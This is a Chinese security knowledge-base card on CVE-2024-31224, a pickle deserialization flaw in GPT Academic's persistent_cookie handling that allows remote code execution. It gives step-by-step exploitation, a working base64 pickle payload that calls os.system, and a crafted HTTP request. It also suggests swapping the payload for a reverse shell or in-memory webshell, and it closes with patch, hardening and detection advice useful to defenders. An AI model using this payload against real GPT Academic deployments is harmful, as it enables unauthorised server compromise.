---
id: web-python-deserialization-gpt-academic-persistent-cookie-pickle-rce
title: GPT Academic CVE-2024-31224：persistent_cookie 直接 base64+pickle.loads 反序列化 RCE（3.64–3.73）
type: scenario
domain: web
path: web/python/deserialization
technique: gpt-academic-persistent-cookie-pickle-rce
aliases:
- CVE-2024-31224
- GPT Academic RCE
- persistent_cookie pickle
- from_cookie_str 反序列化
- 自定义菜单 Cookie RCE
tags:
- python
- pickle
- deserialization
- cookie
- rce
- gpt-academic
- gradio
- cve-2024-31224
cve:
- CVE-2024-31224
severity: critical
confidence: high
affected_versions: 3.64–3.73（3.74 修复）
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V461
  verified_at: '2026-11-10T14:08:16+08:00'
  notes: 已对照原文与 11 张图片核对：themes/theme.py 的 from_cookie_str base64+pickle.loads、main.py 214/226 行 persistent_cookie 调用、3.74 补丁改 JSON、payload Y29z...Ui4= 与 3.70 弹计算器截图均一致；affected_versions 3.64–3.73（3.74 修复）为原文明确标注，保留。未验证点：未自行搭建 3.70 复现。dup-scan.json 早于建卡且无本篇 pair。
---

## 一句话结论

GPT Academic（gpt_academic）3.64–3.73 的 `themes/theme.py` 中 `from_cookie_str(c)` 对传入字符串做 base64 解码后直接 `pickle.loads`，而 `main.py` 在自定义菜单按钮的保存/加载流程里把浏览器 Cookie `persistent_cookie` 原样传给它且无签名/白名单校验；攻击者把自己的 `persistent_cookie` 换成恶意 pickle 的 base64，再点击“确认并保存/加载已保存”即可在服务端执行任意命令。

## 原理

- **不安全的 Cookie 序列化**：`to_cookie_str(d)` 用 `pickle.dumps(d)` 序列化字典再 base64；`from_cookie_str(c)` 反向 `base64.b64decode` 后直接 `pickle.loads(pickled_dict)`。pickle 是代码执行原语：流中的 `GLOBAL`（`c`）可指定任意模块函数、`REDUCE`（`R`）负责调用，因此无需任何 gadget 链即可直接调用 `os.system`。
- **用户可控的入口**：`main.py` 在自定义菜单按钮的 `assign_btn` 回调中执行 `persistent_cookie_ = from_cookie_str(persistent_cookie_)`（第 214/226 行附近），失败才回退为空字典；`persistent_cookie_` 来自 HTTP Cookie，访问者可任意设置，且代码没有签名、HMAC、类型白名单或 unpickler 限制。
- **触发流程**：Web UI（Gradio，默认 43333 端口）的“界面外观 → 自定义菜单”提供“确认并保存/加载已保存”按钮；只要页面发起该回调并携带构造的 Cookie，服务端就会解析 `persistent_cookie`，在 `pickle.loads` 时执行 payload。
- **补丁**：3.74 将 `to_cookie_str`/`from_cookie_str` 从 pickle 改为 `json.dumps`/`json.loads`，不再反序列化任意对象。
- **影响面**：项目在 GitHub 有大量 Star，且测绘可见大量公网实例；任何把 3.64–3.73 服务暴露到互联网的部署都可被未授权利用（攻击者设置的是自己的 Cookie，不需要他人会话）。

## 触发条件

- 目标运行 gpt_academic 3.64–3.73（受影响区间），且 Web UI 可被攻击者访问。
- 目标存在自定义菜单相关回调（默认功能）；攻击者能设置自己的 `persistent_cookie` 并触发“确认并保存/加载已保存”。
- 服务端 Python 环境允许 `os.system`/`subprocess` 等调用（默认允许）。
- 仅限授权测试。

## 利用步骤

1. 访问目标 Web UI，进入“界面外观 → 自定义菜单”，随便填写一个自定义按钮并保存，使应用下发 `persistent_cookie`（或直接在浏览器 DevTools 中添加同名 Cookie）。
2. 生成 pickle payload 并 base64：`cos\nsystem\n(S'calc'\ntR.` → `Y29zCnN5c3RlbQooUydjYWxjJwp0Ui4=`（`cos`=GLOBAL os.system，`R`=REDUCE 调用）。
3. 在 DevTools → Application → Cookies 中把 `persistent_cookie` 的值替换为该 base64，刷新/保留页面。
4. 点击“确认并保存”或“加载已保存”，服务端 `from_cookie_str` 解码并 `pickle.loads`，命令执行。
5. 将 `calc` 换成反弹 shell、写文件或内存马载荷，按目标环境选择回显/外带方式。

## PoC

```python
import base64
# pickle 协议 0：GLOBAL os system / MARK / STRING 'calc' / TUPLE / REDUCE / STOP
payload = b"cos\nsystem\n(S'calc'\ntR."
print(base64.b64encode(payload).decode())
# Y29zCnN5c3RlbQooUydjYWxjJwp0Ui4=
```

```http
GET / HTTP/1.1
Host: target:43333
Cookie: persistent_cookie=Y29zCnN5c3RlbQooUydjYWxjJwp0Ui4=
```

设置 Cookie 后在 UI 点击“确认并保存/加载已保存”触发；原文在 3.70 本地环境用该 payload 成功弹出计算器。

## 变体与关联

- **payload 变体**：pickle 协议 0/2/4 均可构造；可换成 `subprocess.check_output`、`builtins.eval` 等，或使用成熟 pickle 生成器；无长度限制时可携带完整反弹 shell。
- **同类 Cookie pickle**：与 Flask/Django/Bottle 的签名 Cookie pickle 链（[[web-python-deserialization-flask-path-traversal-signed-cookie-pickle-rce]]、[[web-python-deserialization-django-file-cache-pickle-rce]]、[[web-python-deserialization-bottle-signed-cookie-pickle-rce]]）相比，本例 Cookie **没有签名**，直接 base64 明文 pickle，利用门槛更低。
- **关联**：[[web-python-deserialization-pker-opcode-primitives]]（pickle opcode 基础）、[[web-python-deserialization-pickle-minimal-payload-under-length-limit]]（短 payload 构造）。

## 检测与防御

- **升级**：升级到 3.74 及以上（补丁改为 JSON），或移除 `from_cookie_str` 的 pickle 使用。
- **代码层**：Cookie 只允许签名后的 JSON/服务端会话；禁止对任何客户端数据调用 `pickle.loads`；必须用时限制在 `RestrictedUnpickler` 白名单类，并加 HMAC 校验。
- **暴露面**：不要把 GPT Academic UI 直接暴露公网；加认证、访问控制与网络隔离。
- **检测**：请求 Cookie 中出现 `persistent_cookie` 且值为 base64 的 pickle 特征（协议 0 的 `cos`/`c__builtin__`、协议 2+ 的 `gASV` 开头、`\x80\x04` 等）、`system`/`subprocess` 类名；Web 进程异常派生子进程（calc/shell）或外连；对 43333 端口异常访问告警。
